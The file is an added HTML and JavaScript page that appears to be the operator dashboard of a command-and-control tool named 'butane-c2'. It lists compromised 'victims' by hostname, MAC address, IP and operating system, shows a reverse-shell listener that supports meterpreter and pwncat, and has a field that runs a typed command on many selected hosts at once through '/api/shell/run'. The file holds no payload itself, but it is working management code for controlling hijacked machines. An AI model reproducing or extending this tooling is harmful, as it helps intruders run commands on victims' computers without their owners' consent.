@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+<head>
+    <script src="/chart.js"></script>
+    <title>butane-c2 | 0 clients</title>
+    <style>
+        body {
+            background-color: #121212;
+        }
+
+        h1,h2,h3,h4,h5,h6,ul,li,span,text,textarea {
+            color: #f0f0f0;
+            font-family: monospace;
+        }
+
+        input[type=text] {
+            background-color: #363636;
+            border-radius: 4px;
+            color: white;
+            border-color: #646464;
+        }
+
+        .box {
+
+            border-radius: 25px;
+            background: #181818;
+
+            width: 48vh;
+            height: 350px;
+            margin: 16px;
+            padding: 12px;
+            padding-bottom: 36px;
+        }
+
+        .box-big {
+
+            display: inline;
+
+            border-radius: 25px;
+            background: #181818;
+
+            margin: 16px;
+            padding: 12px;
+            padding-bottom: 36px;
+
+            width: 97.5%;
+            height: 100vh;
+            overflow: scroll;
+        }
+
+        .tiny-box {
+            display: inline-block;
+
+            border-radius: 6px;
+            background: #242424;
+
+            width: 22.5%;
+            height: 100%;
+            margin: 4px;
+            padding: 16px;
+
+        }
+            .tiny-box h2,span {
+                margin: 2px;
+            }
+
+            .tiny-box ul {
+                margin: 8px;
+                padding: 8px;
+            }
+
+            .tiny-box input[type="checkbox"] {
+                float: right;
+            }
+
+        .box-container {
+            display: flex;
+            padding: 4px;
+            width: 100%
+        }
+
+        .charts {
+            display: flex;
+        }
+
+        .chart {
+            width: 16vw;
+            height: 100%;
+            float: left;
+            position: relative;
+            margin: 0.75%;
+        }
+
+        .tiny-button {
+            border: none;
+            outline: none;
+
+            border-radius: 4px;
+            background: #242424;
+            color: white;
+
+            transition: background-color 0.1s ease, color 0.1s ease;
+
+            font-family: 'Roboto', sans-serif;
+            font-weight: bold;
+
+            padding: 2px 12px 2px
+        }
+
+            .tiny-button:hover {
+                background-color: #363636; /* New background color on hover */
+            }
+
+            .tiny-button:active {
+                transform: translateY(1px);
+            }
+
+        .connect-button {
+            border: none;
+            outline: none;
+
+            border-radius: 4px;
+            background: #181818;
+            color: white;
+            
+            width: 100%;
+            height: 20%;
+
+            transition: background-color 0.1s ease, color 0.1s ease;
+
+            font-family: 'Roboto', sans-serif;
+            font-weight: bold;
+
+            padding: 10px;
+        }
+
+            .connect-button:hover {
+                background-color: #363636; /* New background color on hover */
+            }
+
+            .connect-button:active {
+                transform: translateY(1px);
+            }
+
+        select {
+            background-color: #363636 !important;
+            color: white;
+            border-radius: 4px;
+            border-color: #646464;
+        } select option {
+            color: white;
+            background-color: #363636 !important;
+        }
+
+        @media (max-width: 1000px) {
+            .box {
+                min-width: 85%;
+                max-width: 80vw;
+            }
+
+            .charts {
+                padding: 10px;
+                display: flex;
+                flex-direction: column;
+                height: 100%;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .chart {
+                width: 30vh;
+                height: auto;
+            }
+
+            .tiny-box {
+                width: 90%;
+                margin-left: 2px;
+                
+            }
+
+            .box-big {
+                width: 100vw;
+            }
+            
+        }
+    </style>
+</head>
+<body>
+    <div class="box-container">
+        <div class="box" style="float:left; width: 25%">
+            <h1>welcome</h1>
+            <div style="height: 50%">
+                <span>
+                    some text
+                </span>
+            </div>
+
+            <hr style="color: #484848; background-color: #484848; height: 2px;">
+
+            <h2 id="total">total clients: 0</h2>
+
+            <hr style="color: #484848; background-color: #484848; height: 2px;">
+
+            <div style="margin: auto">
+                <span id="hosts-1">async execute command on 0 hosts</span>
+                <br>
+                <input type="text" style="margin-top: 8px; width: 77.5%" id="multirun">
+                <button class="tiny-button" style="width: 15%; margin-left: 8px; padding: 4px 4px">send</button>
+            </div>
+        </div>
+
+        <div class="box charts" style="float:left; width: 60%">
+            <div class="chart">
+                <canvas id="piechart1" style="float: left;"></canvas>
+            </div>
+
+            <div class="chart">
+                <canvas id="piechart2" style="float: left;"></canvas>
+            </div>
+
+            <div class="chart">
+                <canvas id="piechart3" style="float: left;"></canvas>
+            </div>
+        </div>
+
+        <div class="box" style="float:right; width: 20%;">
+            <div style="float: left; width: 100%; height: 97.5%">
+                <h2>listener:</h2>
+
+                <h1 id="listenerIP">192.168.0.0:6940</h1>
+
+                <h2>supports:</h2>
+                <ul>
+                    <li>meterpreter</li>
+                    <li>basic</li>
+                    <li>pwncat</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <div class="box-big" style="float:left;">
+        <div style="float: right; padding: 16px">
+            <span>search by</span>
+            <select style="margin-left: 8px;" id="search-dropdown">
+                <option value="oui">MAC OUI</option>
+                <option value="mac">MAC</option>
+                <option value="ip">IP Address</option>
+                <option value="hostname">Hostname</option>
+                <option value="shelltype">Shell Type</option>
+                <option value="os">Operating System</option>
+                <option value="arch">Architecture</option>
+                <option value="active">Activity</option>
+            </select>
+            <input type="text" id="search" style="margin-left: 8px">
+        </div>
+
+        <h1 style="padding-left: 8px">victims</h1>
+
+        <div id="boxtainer"></div>
+
+    </div>
+    <script>
+        var conns = new Chart(document.getElementById('piechart1'), {
+        type: 'pie',
+        data: {
+            labels: ['no data'],
+            datasets: [{
+            data: [1],
+            backgroundColor: [
+            "rgb(180, 180, 180)"
+            ],
+            borderWidth: 1,
+            borderColor: 'transparent'
+            }]
+        },
+        options: {
+            responsive: true,
+            plugins: {
+            legend: {
+                position: 'top',
+                display: false,
+                responsive: true
+            },
+            title: {
+                display: true,
+                text: 'status of connections'
+            }
+            }
+        },
+        });
+
+        var ouis = new Chart(document.getElementById('piechart2'), {
+        type: 'pie',
+        data: {
+            labels: ["no data"],
+            datasets: [{
+            data: [1],
+            backgroundColor: ["rgb(180, 180, 180)"],
+            borderWidth: 1,
+            borderColor: 'transparent'
+            }]
+        },
+        options: {
+            responsive: true,
+            plugins: {
+            legend: {
+                position: 'top',
+                display: false,
+                responsive: true
+            },
+            title: {
+                display: true,
+                text: 'OUIs'
+            }
+            }
+        },
+        });
+
+        var oses = new Chart(document.getElementById('piechart3'), {
+        type: 'pie',
+        data: {
+            labels: ['no data'],
+            datasets: [{
+            data: [1],
+            backgroundColor: [
+            "rgb(180, 180, 180)"
+            ],
+            borderWidth: 1,
+            borderColor: 'transparent'
+            }]
+        },
+        options: {
+            responsive: true,
+            plugins: {
+            legend: {
+                position: 'top',
+                display: false,
+                responsive: true
+            },
+            title: {
+                display: true,
+                text: 'victim operating systems'
+            }
+            }
+        },
+        });
+    </script>
+    <script>
+        const selectedArray = []
+        var victimArray = []
+        var ouiArray = []
+        const container = document.getElementById('boxtainer');
+        var mostRecentData = ""
+        var haltCreation = false
+
+        String.prototype.formatUnicorn = String.prototype.formatUnicorn ||
+        function () {
+            "use strict";
+            var str = this.toString();
+            if (arguments.length) {
+                var t = typeof arguments[0];
+                var key;
+                var args = ("string" === t || "number" === t) ?
+                    Array.prototype.slice.call(arguments)
+                    : arguments[0];
+
+                for (key in args) {
+                    str = str.replace(new RegExp("\\{" + key + "\\}", "gi"), args[key]);
+                }
+            }
+
+            return str;
+        };
+
+        function rgbToHex(rgbString) {
+            const match = rgbString.match(/^rgb\((\d+),\s*(\d+),\s*(\d+)\)$/);
+
+            if (!match) {
+                throw new Error('Invalid RGB string format');
+            }
+
+            const toHex = (c) => {
+                const hex = c.toString(16);
+                return hex.length === 1 ? "0" + hex : hex;
+            };
+
+            return "#" + toHex(parseInt(match[1])) + toHex(parseInt(match[2])) + toHex(parseInt(match[3]));
+        }
+
+        function createTinyBox(data) {
+            // Create the main div element
+            const tinyBox = document.createElement('div');
+            var active = 0;
+            tinyBox.classList.add('tiny-box');
+            tinyBox.id = data['uid']+"_DIV"
+
+            const bigDiv = document.createElement('div');
+            bigDiv.style.cssText = 'float:left; padding-top: 1px; padding-right: 1px; width: 100%; height: 90%';
+
+            bigDiv.addEventListener("click", function() {
+                var curval = getComputedStyle(tinyBox).backgroundColor
+
+                if (rgbToHex(curval) == "#303030") {
+                    tinyBox.style.backgroundColor = "#242424"
+                    selectedArray.splice(selectedArray.indexOf(bigDiv.id), 1)
+                } else { 
+                    tinyBox.style.backgroundColor = "#303030"
+                    selectedArray.push(data['uid'])
+                }
+                document.getElementById("hosts-1").innerHTML = "async execute command on " + selectedArray.length.toString() + " hosts"
+            })
+
+            // Create the first inner div element with float:right style
+            const innerDiv1 = document.createElement('div');
+            innerDiv1.style.cssText = 'float:right; padding-top: 1px; padding-right: 1px;';
+
+            // Create and append the span elements to innerDiv1
+            const lastActiveSpan = document.createElement('span');
+            lastActiveSpan.textContent = 'Last Active: '+data['lastActive'];
+            lastActiveSpan.id = data['uid']+"_ACTIVITY"
+            innerDiv1.appendChild(lastActiveSpan);
+
+            innerDiv1.appendChild(document.createElement('br'));
+
+            if (data['active'] == "0") {
+                active = "disconnected"
+            } else { active = data['active'] }
+            const activeSpan = document.createElement('span');
+            activeSpan.textContent = 'Active: '+active;
+            innerDiv1.appendChild(activeSpan);
+
+            innerDiv1.appendChild(document.createElement('br'));
+
+            // Create the h2 element
+            const h2Element = document.createElement('h2');
+            h2Element.textContent = data['hostname'];
+
+            // Create the span elements
+            const macSpan = document.createElement('span');
+            macSpan.textContent = data['mac'];
+
+            const ipSpan = document.createElement('span');
+            ipSpan.textContent = 'IP: '+data['ip'];
+
+            const ouiSpan = document.createElement('span');
+            ouiSpan.textContent = 'OUI: '+data['oui'];
+
+            // Create the second inner div element with margin: 0 style
+            const innerDiv2 = document.createElement('div');
+            innerDiv2.style.margin = '0';
+
+            // Create the ul element
+            const ulElement = document.createElement('ul');
+            ulElement.style.cssText = 'float: left;';
+
+            // Create and append the span elements to ulElement
+            const cpuArchitectureSpan = document.createElement('span');
+            cpuArchitectureSpan.textContent = 'CPU Architecture: '+data['arch'];
+            ulElement.appendChild(cpuArchitectureSpan);
+            ulElement.appendChild(document.createElement('br'));
+
+            const operatingSystemSpan = document.createElement('span');
+            operatingSystemSpan.textContent = 'Operating System: '+data['os'];
+            ulElement.appendChild(operatingSystemSpan);
+            ulElement.appendChild(document.createElement('br'));
+
+            const shellTypeSpan = document.createElement('span');
+            shellTypeSpan.textContent = 'Shell Type: '+data['shelltype'];
+            ulElement.appendChild(shellTypeSpan);
+            ulElement.appendChild(document.createElement('br'));
+
+            // Create the button element
+            const buttonElement = document.createElement('button');
+            buttonElement.classList.add('connect-button');
+            buttonElement.textContent = 'connect';
+            buttonElement.addEventListener('click', function() {
+                location.href = "/shell?uid="+data["uid"]
+            });
+
+            // Append elements to their respective parent elements
+            bigDiv.appendChild(innerDiv1);
+            bigDiv.appendChild(h2Element);
+            bigDiv.appendChild(macSpan);
+            bigDiv.appendChild(document.createElement('br'));
+            bigDiv.appendChild(ipSpan);
+            bigDiv.appendChild(document.createElement('br'));
+            bigDiv.appendChild(ouiSpan);
+            innerDiv2.appendChild(ulElement);
+            bigDiv.appendChild(innerDiv2);
+            tinyBox.append(bigDiv)
+            tinyBox.appendChild(buttonElement);
+
+            // Return the created div
+            return tinyBox;
+        }
+
+        function isUIDExist(uid) {
+            for (var i = 0; i < victimArray.length; i++) {
+                if (victimArray[i] == uid) {
+                    return true;
+                }
+            }
+            return false;
+        }
+
+        function isOUIExist(oui) {
+            for (var i = 0; i < ouiArray.length; i++) {
+                if (ouiArray[i] == oui) {
+                    return true;
+                }
+            }
+            return false;
+        }
+
+        function generateRandomColor() {
+            var r = Math.floor(Math.random() * 155);
+            var g = Math.floor(Math.random() * 155);
+            var b = Math.floor(Math.random() * 155);
+
+            return `rgb(${r},${g},${b})`;
+        }
+
+
+        function updateData() {
+            var xhr = new XMLHttpRequest();
+
+            xhr.open('GET', '/api/data/clients', true);
+            xhr.onload = function() {
+                var jsonData = JSON.parse(xhr.responseText)
+                var ouiFound = false
+                var linux = 0
+                var windows = 0
+                var connected = 0
+                var disconnected = 0
+
+                mostRecentData = jsonData
+                
+                for (var i=0; i<Object.keys(jsonData).length; i++) {
+                    var uid = Object.keys(jsonData)[i]
+
+                    if (!isUIDExist(uid)) {
+                        victimArray.push(uid)
+                        if (!haltCreation) { container.appendChild(createTinyBox(jsonData[uid])); }
+                    } else {
+                        if (!haltCreation) { document.getElementById(uid+"_ACTIVITY").innerHTML = "Last Active: " + jsonData[uid]["lastActive"] }
+                    }
+
+                    if (jsonData[uid]["os"] == "Linux") {
+                        linux += 1
+                    } else {
+                        windows += 1
+                    }
+
+                    if (jsonData[uid]["active"] == "0") {
+                        disconnected += 1
+                    } else {
+                        connected += 1
+                    }
+
+                    if (!isOUIExist(uid)) { // if its not already added
+                        // add it
+
+                        if (ouis.data.labels[0] == "no data") {
+                            ouis.data.datasets[0].data = []
+                            ouis.data.labels.splice(0, 1)
+                            ouis.data.datasets[0].backgroundColor.splice(0, 1)
+                        }
+
+                        for (var i=0; i<ouis.data.labels.length; i++) {
+                            if (jsonData[uid]["oui"] == ouis.data.labels[i]) {
+                                ouiFound = i
+                                break
+                            }
+                        }
+
+                        if (!ouiFound) {
+                            ouis.data.labels.push(jsonData[uid]["oui"]) // create the new label
+                            ouis.data.datasets[0].data.push(1) // push the new value (1 since it never existed before)
+                            ouis.data.datasets[0].backgroundColor.push(generateRandomColor()); // generate a random color
+                            ouis.update(); // update
+                        } else {
+                            ouis.data.datasets[0].data[ouiFound] += 1 // just add one
+                            ouis.update() // update
+                        }
+
+                        ouiArray.push(uid)
+
+                    }
+                }
+                
+                if (windows != 0 || linux != 0) {
+                    if (oses.data.labels[0] == "no data") {
+                        oses.data.datasets[0].backgroundColor = ['#4169E1','#ff8c00']
+                        oses.data.datasets[0].data.splice(0, 1)
+                        oses.data.labels = ["windows", "linux"]
+                    }
+                    oses.data.datasets[0].data = [windows, linux];
+                    oses.update();
+                }
+
+                if (connected != 0 || disconnected != 0) {                    
+                    if (conns.data.labels[0] == "no data") {
+                        conns.data.datasets[0].backgroundColor = ['#003C00','#880808']
+                        conns.data.datasets[0].data.splice(0, 1)
+                        conns.data.labels = ["connections", "disconnections"]
+                    }
+                    conns.data.datasets[0].data = [connected, disconnected];
+                    conns.update();
+                }
+
+                document.getElementById("total").innerHTML = "total clients: " + (Object.keys(jsonData).length).toString()
+                document.title = "butane-c2 | " + Object.keys(jsonData).length.toString() + " clients"
+            };
+
+            xhr.send();
+        }
+
+        /* Usage:
+        const container = document.getElementById('boxtainer'); // Assuming you have a container element with id 'container'
+        const newTinyBox = createTinyBox({
+            "os": "Windows 10",
+            "mac": "11:22:33:44:55:77",
+            "ip": "192.168.0.1",
+            "firstSeen": "1am",
+            "lastActive": "not 1am",
+            "arch": "x86",
+            "shelltype": "powershell",
+            "hostname": "DESKTOP-123456789",
+        });
+        container.appendChild(newTinyBox);
+        */
+
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', '/api/data/host', true);
+        xhr.onload = function() {
+            var jsonData = JSON.parse(xhr.responseText)
+            document.getElementById("listenerIP").innerHTML = jsonData["listener"] + ":" + jsonData["port"]
+        };
+
+        xhr.send();
+
+        //updateData() // first update to populate most recent
+
+        document.getElementById("multirun").addEventListener("keydown", function(event) {
+            if (event.key == "Enter") {
+                if (document.getElementById("multirun").value == "!delete") {
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('POST', '/api/shell/delete', true);
+                    xhr.onload = function() {
+                        console.log('remove')
+                        document.getElementById("multirun").value = ""
+
+                        for (var i=0; i<selectedArray.length; i++) {
+                            console.log('remove')
+                            container.removeChild(document.getElementById(selectedArray[i]+"_DIV"));
+                            updateData();
+                        }
+                    };
+
+                    xhr.send(JSON.stringify({
+                        "uid": selectedArray,
+                    }));
+
+                    return;
+                }
+
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', '/api/shell/run', true);
+                xhr.onload = function() {
+                    document.getElementById("multirun").value = ""
+                };
+
+                xhr.send(JSON.stringify({
+                    "uid": selectedArray,
+                    "command": document.getElementById("multirun").value
+                }));
+            }
+        })
+
+        document.getElementById("search").addEventListener("input", function() {
+            var val = document.getElementById("search").value 
+            var drpdwn = document.getElementById("search-dropdown").value
+
+            if (val == "") {
+                haltCreation = false
+                updateData();
+            }
+
+            haltCreation = true
+
+            while (container.firstChild) { // kill the children
+                container.removeChild(container.firstChild);
+            }
+
+            for (var i=0; i<Object.keys(mostRecentData).length; i++) {
+                var uid = Object.keys(mostRecentData)[i]
+
+                if (mostRecentData[uid][drpdwn].toLowerCase().includes(val.toLowerCase())) { // somehow this works. i dont know how but it works and im not complaining
+                    container.appendChild(createTinyBox(mostRecentData[uid]));
+                }
+
+            }
+
+        })
+
+        setInterval(updateData, 1000);
+
+    </script>
+</body>
